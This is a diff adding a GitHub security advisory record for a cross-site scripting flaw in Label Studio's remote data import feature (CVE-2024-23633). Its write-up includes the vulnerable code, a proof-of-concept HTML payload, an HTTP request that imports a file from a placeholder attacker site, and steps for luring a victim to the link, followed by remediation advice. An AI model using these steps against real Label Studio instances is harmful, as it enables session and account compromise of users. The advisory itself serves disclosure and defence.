@@ -1,0 +1,73 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-fq23-g58m-799r",
+  "modified": "2024-01-24T14:21:47Z",
+  "published": "2024-01-24T14:21:47Z",
+  "aliases": [
+    "CVE-2024-23633"
+  ],
+  "summary": "Cross-site Scripting Vulnerability on Data Import",
+  "details": "# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "label-studio"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.10.1"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/HumanSignal/label-studio/security/advisories/GHSA-fq23-g58m-799r"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-23633"
+    },
+    {
+      "type": "WEB",
+      "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/HumanSignal/label-studio"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-79"
+    ],
+    "severity": "MODERATE",
+    "github_reviewed": true,
+    "github_reviewed_at": "2024-01-24T14:21:47Z",
+    "nvd_published_at": "2024-01-24T00:15:08Z"
+  }
+}
